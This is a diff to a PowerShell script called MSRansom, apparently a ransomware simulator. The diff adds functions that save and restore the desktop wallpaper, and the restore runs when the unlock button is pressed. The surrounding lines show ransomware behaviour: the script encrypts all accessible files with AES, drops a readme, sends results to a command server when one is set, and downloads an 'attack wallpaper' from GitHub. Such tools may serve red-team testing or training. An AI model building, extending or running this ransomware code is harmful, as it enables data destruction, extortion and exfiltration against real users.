@@ -1,4 +1,4 @@
-﻿function MSRansom
+function MSRansom
 {
 
 # Design
@@ -188,6 +188,42 @@ public static extern int SystemParametersInfo(int uAction, int uParam, string lp
     }
     Catch {
         Write-Host "[!] Error downloading or setting wallpaper: $($_.Exception.Message)" -ForegroundColor Red
+    }
+}
+
+# Function to save the current wallpaper path
+function Save-OriginalWallpaper {
+    Try {
+        $regPath = "HKCU:\Control Panel\Desktop"
+        $Global:OriginalWallpaperPath = (Get-ItemProperty -Path $regPath -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
+    }
+    Catch {
+        $Global:OriginalWallpaperPath = $null
+    }
+}
+
+# Function to restore the original wallpaper
+function Restore-OriginalWallpaper {
+    Try {
+        if ($null -ne $Global:OriginalWallpaperPath -and $Global:OriginalWallpaperPath -ne "") {
+            $SPI_SETDESKWALLPAPER = 0x14
+            $SPIF_UPDATEINIFILE = 0x01
+            $SPIF_SENDCHANGE = 0x02
+            
+            # Ensure the type is available
+            if (-not ([System.Management.Automation.PSTypeName]'Win32.User32').Type) {
+                $signature = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+'@
+                Add-Type -MemberDefinition $signature -Name "User32" -Namespace "Win32" -PassThru | Out-Null
+            }
+            
+            [Win32.User32]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Global:OriginalWallpaperPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE) | Out-Null
+        }
+    }
+    Catch {
+        # Silent operation
     }
 }
 
@@ -438,6 +474,8 @@ $unlockButton.add_Click({
         $Global:KeyCorrect = $true
         $timer.Stop()
         $explorerTimer.Stop()
+        # Restore the original wallpaper
+        Restore-OriginalWallpaper
         # Create a timer to close the form after 2 seconds
         $closeTimer = New-Object System.Windows.Forms.Timer
         $closeTimer.Interval = 2000 # 2 seconds
@@ -617,6 +655,9 @@ else {
     Write-Host "[!] Encrypting all accessible files with 256-bit AES encryption..." -ForegroundColor Red
     CreateReadme ; EncryptFiles ;
     if ($C2Status) { SendResults }
+
+    # Save original wallpaper before changing it
+    Save-OriginalWallpaper
 
     # Call the wallpaper function
     $wallpaperUrl = "https://raw.githubusercontent.com/IAMinZoho/MSRansom/refs/heads/main/Attack_Wallpaper.jpg"
